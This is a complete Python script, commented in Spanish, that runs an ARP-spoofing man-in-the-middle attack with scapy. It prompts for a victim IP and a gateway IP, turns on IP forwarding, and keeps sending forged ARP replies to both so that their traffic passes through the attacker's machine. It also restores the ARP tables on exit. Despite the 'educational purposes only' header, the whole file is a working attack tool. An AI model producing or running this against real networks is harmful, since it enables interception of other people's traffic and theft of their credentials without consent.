#!/usr/bin/env python3
"""
ARP MITM Script - For educational purposes only.
"""

from scapy.all import *
import sys
import time
import signal
import os

# Variables globales para controlar la interceptación
target_ip = ""
gateway_ip = ""
interface = ""
running = True

def get_input():
    """Solicita información al usuario."""
    global target_ip, gateway_ip, interface
    print("[*] Configuración del ataque MITM ARP")
    target_ip = input("[?] IP del objetivo (víctima): ").strip()
    gateway_ip = input("[?] IP del gateway/router: ").strip()
    interface = input("[?] Interfaz de red (ej: eth0): ").strip()
    print(f"[*] Objetivo: {target_ip}, Gateway: {gateway_ip}, Interfaz: {interface}")

def get_mac(ip):
    """Obtiene la dirección MAC de una IP."""
    ans, _ = arping(ip, timeout=2, verbose=0, iface=interface)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def arp_spoof(target_ip, target_mac, spoof_ip):
    """Envía un ARP reply falso para envenenar la cache ARP."""
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(arp_response, verbose=0, iface=interface)

def restore_arp(target_ip, target_mac, gateway_ip, gateway_mac):
    """Restaura las tablas ARP a su estado original."""
    arp_correct = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(arp_correct, count=5, verbose=0, iface=interface)
    print(f"[*] Tabla ARP restaurada para {target_ip}")

def enable_ip_forwarding():
    """Habilita el forwarding de IP en el sistema (Linux)."""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding habilitado")

def disable_ip_forwarding():
    """Deshabilita el forwarding de IP."""
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding deshabilitado")

def signal_handler(sig, frame):
    """Maneja la señal Ctrl+C para limpiar."""
    global running
    print("\n[*] Detectado Ctrl+C. Limpiando...")
    running = False

def main():
    global running
    get_input()
    enable_ip_forwarding()

    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[!] Error: No se pudo obtener una dirección MAC. Verifique las IPs.")
        return

    print(f"[*] MAC objetivo: {target_mac}")
    print(f"[*] MAC gateway: {gateway_mac}")
    print("[*] Comenzando envenenamiento ARP...")

    signal.signal(signal.SIGINT, signal_handler)
    packet_count = 0

    try:
        while running:
            # Envenena la víctima diciendo que el gateway soy yo
            arp_spoof(target_ip, target_mac, gateway_ip)
            # Envenena el gateway diciendo que la víctima soy yo
            arp_spoof(gateway_ip, gateway_mac, target_ip)
            packet_count += 2
            print(f"[+] Paquetes ARP falsos enviados: {packet_count}", end='\r')
            time.sleep(2)  # Mantiene el envenenamiento activo
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        # Limpieza
        print("\n[*] Restaurando tablas ARP...")
        restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
        restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
        disable_ip_forwarding()
        print("[*] Ataque MITM finalizado.")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Este script requiere permisos de superusuario (sudo).")
        sys.exit(1)
    main()
